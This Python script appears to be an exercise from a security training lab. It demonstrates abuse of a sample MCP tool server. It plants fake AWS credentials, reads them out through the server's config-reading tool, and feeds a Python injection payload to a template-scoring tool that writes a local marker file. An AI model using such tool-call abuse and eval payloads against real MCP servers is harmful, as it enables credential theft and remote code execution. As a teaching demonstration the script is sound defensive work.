#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.dont_write_bytecode = True

from dojo_app.barryflights_mcp_server import (
    FAKE_AWS_ACCESS_KEY,
    FAKE_AWS_SECRET_KEY,
    FAKE_AWS_SESSION_TOKEN,
)
from dojo_app.lab_output import print_status


STATE = ROOT / ".lab-state" / "darkside"
MCP_SCRIPT = ROOT / "samples" / "mcp" / "workspace-admin-bridge.py"


def load_mcp_module():
    spec = importlib.util.spec_from_file_location("workspace_admin_bridge_demo", MCP_SCRIPT)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"could not load {MCP_SCRIPT}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def fake_aws_credentials() -> str:
    return "\n".join(
        [
            "[openclaw-lab]",
            f"aws_access_key_id = {FAKE_AWS_ACCESS_KEY}",
            f"aws_secret_access_key = {FAKE_AWS_SECRET_KEY}",
            f"aws_session_token = {FAKE_AWS_SESSION_TOKEN}",
            "",
        ]
    )


def relative(path: Path) -> str:
    try:
        return str(path.relative_to(ROOT))
    except ValueError:
        return str(path)


def main() -> int:
    STATE.mkdir(parents=True, exist_ok=True)
    fake_home = STATE / "fake-home"
    creds_path = fake_home / ".aws" / "credentials"
    creds_path.parent.mkdir(parents=True, exist_ok=True)
    creds_path.write_text(fake_aws_credentials(), encoding="utf-8")

    stolen_path = STATE / "mcp-secret-read.json"
    rce_marker = STATE / "mcp-rce-demo.txt"
    stolen_path.unlink(missing_ok=True)
    rce_marker.unlink(missing_ok=True)

    module = load_mcp_module()
    secret = json.loads(module.read_runtime_config(str(creds_path)))
    stolen_path.write_text(json.dumps(secret, indent=2, sort_keys=True), encoding="utf-8")
    module.score_template_expression(
        "__import__('pathlib').Path(%r).write_text('mcp eval executed')"
        % str(rce_marker)
    )

    print_status("DARKSIDE_MCP_ABUSE=pass")
    print("mcp_tool=read_runtime_config")
    print(f"stolen_file={relative(creds_path)}")
    print(f"stolen_report={relative(stolen_path)}")
    for line in secret.get("content", "").splitlines():
        if line.startswith("aws_"):
            print(line)
    print("mcp_tool=score_template_expression")
    print(f"rce_marker={relative(rce_marker)}")
    print_status("OOPS_MCP_RCE=local-file-written")
    return 0 if rce_marker.exists() else 1


if __name__ == "__main__":
    raise SystemExit(main())
